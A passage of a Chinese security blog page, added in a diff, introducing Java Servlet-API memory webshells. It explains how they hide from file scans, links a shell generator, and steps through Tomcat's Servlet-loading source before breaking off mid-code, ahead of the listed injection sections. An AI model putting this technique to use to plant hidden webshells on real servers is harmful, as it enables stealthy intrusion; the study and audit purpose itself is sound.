@@ -1,0 +1,1549 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Servlet API型内存马">
+<title>Servlet API型内存马</title>
+
+<link rel='canonical' href='https://lserein.github.io/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="Servlet API型内存马">
+<meta property='og:description' content="Servlet API型内存马">
+<meta property='og:url' content='https://lserein.github.io/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/'>
+<meta property='og:site_name' content='Lsec&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-09-29T20:17:10&#43;08:00'/><meta property='article:modified_time' content='2025-09-29T20:57:19&#43;08:00'/><meta property='og:image' content='https://lserein.github.io/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/logo.jpg' />
+<meta name="twitter:title" content="Servlet API型内存马">
+<meta name="twitter:description" content="Servlet API型内存马"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://lserein.github.io/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/logo.jpg' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_5a2f261f7f9cea8c.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Lsec&#39;s Blog</a></h1>
+            <h2 class="site-description">欢迎来到Lsec的博客</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Lserein/Lserein.github.io'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://x.com/secL15737016'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#1内存马介绍"><strong>1.内存马介绍</strong></a></li>
+    <li><a href="#2servlet型内存马">2.Servlet型内存马</a>
+      <ol>
+        <li><a href="#21注入内存马">2.1.注入内存马</a></li>
+      </ol>
+    </li>
+    <li><a href="#3filter内存马">3.Filter内存马</a>
+      <ol>
+        <li><a href="#31注入内存马条件">3.1.注入内存马条件</a></li>
+      </ol>
+    </li>
+    <li><a href="#4listener内存马">4.Listener内存马</a>
+      <ol>
+        <li><a href="#41注入内存马">4.1.注入内存马</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">
+                <img src="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/logo_hu_611a464930e587bb.jpg"
+                        srcset="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/logo_hu_611a464930e587bb.jpg 800w, /p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/logo_hu_358f32fa1cd22343.jpg 1600w"
+                        width="800" 
+                        height="340" 
+                        loading="lazy"
+                        alt="Featured image of post Servlet API型内存马" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="background-color: #2a9d8f; color: #fff;">
+                学习笔记
+            </a>
+        
+            <a href="/categories/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="background-color: #2a9d8f; color: #fff;">
+                Java代码审计
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">Servlet API型内存马</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Servlet API型内存马
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Sep 29, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 7 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>参考资料：</p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/WzowSV0kTEnuVfMgiSV7Cw"  target="_blank" rel="noopener"
+    >文库更新！JAVA内存马研究0到1（3万字总结，建议收藏）</a></p>
+<p><a class="link" href="https://gv7.me/articles/2020/kill-java-web-filter-memshell/"  target="_blank" rel="noopener"
+    >查杀Java web filter型内存马</a></p>
+<p><strong>一款支持高度自定义的 Java 内存马生成工具：</strong><a class="link" href="https://github.com/pen4uin/java-memshell-generator"  target="_blank" rel="noopener"
+    ><strong>https://github.com/pen4uin/java-memshell-generator</strong></a></p>
+<h2 id="1内存马介绍"><strong>1.内存马介绍</strong>
+</h2><p><strong>内存马是一种将恶意代码直接注入到应用程序运行时内存中的技术手段。与传统的基于文件的WebShell不同，内存马不依赖于磁盘上的任何持久化存储，而是利用Java、.NET等语言提供的反射机制或动态编译功能，在内存中创建并执行恶意逻辑。这种方式不仅能够绕过大多数基于文件扫描的安全防护措施，而且由于其高度的灵活性和隐蔽性，使得一旦成功植入，很难被发现和清除。</strong></p>
+<p><strong>Servlet-API类内存马：Servlet/Filter/Listener</strong></p>
+<p><strong>框架类内存马：Controller/Interceptor</strong></p>
+<p><strong>基于Java Agent类型内存马</strong></p>
+<h2 id="2servlet型内存马">2.Servlet型内存马
+</h2><p><a class="link" href="https://github.com/W01fh4cker/LearnJavaMemshellFromZero"  target="_blank" rel="noopener"
+    >https://github.com/W01fh4cker/LearnJavaMemshellFromZero</a></p>
+<p><a class="link" href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/"  target="_blank" rel="noopener"
+    >Tomcat-Servlet型内存马 - Longlone’s Blog</a></p>
+<p><a class="link" href="https://blog.csdn.net/m0_60442621/article/details/148126872"  target="_blank" rel="noopener"
+    >Java安全-Servlet内存马_servlet 内存马示例-CSDN博客</a></p>
+<p><a class="link" href="https://www.cnblogs.com/nongchaoer/p/15561936.html"  target="_blank" rel="noopener"
+    >JavaWeb 内存马一周目通关攻略 - Luminous~ - 博客园</a></p>
+<p><strong>Tomcat怎么加载的Servlet？在ContextConfig类中，这个类来自于tomcat-catalina这个Jar包</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">//在自己项目的pom.xml文件中添加所需依赖
+</span></span><span class="line"><span class="cl">        &lt;dependency&gt;
+</span></span><span class="line"><span class="cl">            &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;
+</span></span><span class="line"><span class="cl">            &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;
+</span></span><span class="line"><span class="cl">            &lt;!-- 版本按照本地Tomcat版本来 --&gt;
+</span></span><span class="line"><span class="cl">            &lt;version&gt;10.1.26&lt;/version&gt;
+</span></span><span class="line"><span class="cl">        &lt;/dependency&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>如果无法下载源码运行这段命令：</strong><code>mvn dependency:resolve -Dclassifier=sources</code></p>
+<p><img src="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/1.png"
+	width="2214"
+	height="534"
+	srcset="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/1_hu_b3aa6637e15cd895.png 480w, /p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/1_hu_7f696b6e335a56c.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="414"
+		data-flex-basis="995px"
+	
+></p>
+<p><strong>找到configureContext这个函数，这就是将我们Servlet加载到Tomcat容器的代码，打上断点</strong></p>
+<p><img src="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/2.png"
+	width="1704"
+	height="872"
+	srcset="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/2_hu_82f4cb5f5c1fd3fd.png 480w, /p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/2_hu_218ae45d93342597.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="195"
+		data-flex-basis="468px"
+	
+></p>
+<p>这里面就有我们传入的所有Servlet和对应的访问路径</p>
+<p><img src="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/3.png"
+	width="1659"
+	height="1110"
+	srcset="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/3_hu_b436b539b1353043.png 480w, /p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/image/3_hu_cf3d60b8c34982e8.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="149"
+		data-flex-basis="358px"
+	
+></p>
+<p><strong>下面这段代码就是将我们的Servlet遍历添加到Wrapper这个包装对象上，并给他辅助</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">ServletDef</span><span class="w"> </span><span class="n">servlet</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">webxml</span><span class="p">.</span><span class="na">getServlets</span><span class="p">().</span><span class="na">values</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Wrapper</span><span class="w"> </span><span class="n">wrapper</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">context</span><span class="p">.</span><span class="na">createWrapper</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Description is ignored</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Display name is ignored</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Icons are ignored</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// jsp-file gets passed to the JSP Servlet as an init-param</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">servlet</span><span class="p">.</span><span class="na">getLoadOnStartup</span><span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">wrapper</span><span class="p">.</span><span class="na">setLoadOnStartup</span><span class="p">(</span><span class="n">servlet</span><span class="p">.</span><span class="na">getLoadOnStartup</span><span class="p">().</span><span class="na">intValue</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">servlet</span><span class="p">.</span><span class="na">getEnabled</span><span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">wrapper</span><span class="p">.</span><span class="na">setEnabled</span><span class="p">(</span><span class="n">servlet</span><span class="p">.</span><span class="na">getEnabled</span><span class="p">().</span><span class="na">booleanValue</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">wrapper</span><span class="p">.</span><span class="na">setName</span><span class="p">(</span><span class="n">servlet</span><span class="p">.</span><span class="na">getServletName</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">params</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">servlet</span><span class="p">.</span><span class="na">getParameterMap</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">Entry</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">entry</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">params</span><span class="p">.</span><span class="na">entrySet</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">wrapper</span><span class="p">.</span><span class="na">addInitParameter</span><span class="p">(</span><span class="n">entry</span><span class="p">.</span><span class="na">getKey</span><span class="p">(),</span><span class="w"> </span><span class="n">entry</span><span class="p">.</span><span class="na">getValue</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">wrapper</span><span class="p">.</span><span class="na">setRunAs</span><span class="p">(</span><span class="n">servlet</span><span class="p">.</span><span class="na">getRunAs</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Set</span><span class="o">&lt;</span><span class="n">SecurityRoleRef</span><span class="o">&gt;</span><span class="w"> </span><span class="n">roleRefs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">servlet</span><span class="p">.</span><span class="na">getSecurityRoleRefs</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">SecurityRoleRef</span><span class="w"> </span><span class="n">roleRef</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">roleRefs</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">wrapper</span><span class="p">.</span><span class="na">addSecurityReference</span><span class="p">(</span><span class="n">roleRef</span><span class="p">.</span><span class="na">getName</span><span class="p">(),</span><span class="w"> </span><span class="n">roleRef</span><span class="p">.</span><span class="na">getLink</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">wrapper</span><span class="p">.</span><span class="na">setServletClass</span><span class="p">(</span><span class="n">servlet</span><span class="p">.</span><span class="na">getServletClass</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">MultipartDef</span><span class="w"> </span><span class="n">multipartdef</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">servlet</span><span class="p">.</span><span class="na">getMultipartDef</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">multipartdef</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">long</span><span class="w"> </span><span class="n">maxFileSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="n">1</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">long</span><span class="w"> </span><span class="n">maxRequestSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="n">1</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">fileSizeThreshold</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="kc">null</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">multipartdef</span><span class="p">.</span><span class="na">getMaxFileSize</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">maxFileSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Long</span><span class="p">.</span><span class="na">parseLong</span><span class="p">(</span><span class="n">multipartdef</span><span class="p">.</span><span class="na">getMaxFileSize</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="kc">null</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">multipartdef</span><span class="p">.</span><span class="na">getMaxRequestSize</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">maxRequestSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Long</span><span class="p">.</span><span class="na">parseLong</span><span class="p">(</span><span class="n">multipartdef</span><span class="p">.</span><span class="na">getMaxRequestSize</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="kc">null</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">multipartdef</span><span class="p">.</span><span class="na">getFileSizeThreshold</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">fileSizeThreshold</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Integer</span><span class="p">.</span><span class="na">parseInt</span><span class="p">(</span><span class="n">multipartdef</span><span class="p">.</span><span class="na">getFileSizeThreshold</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
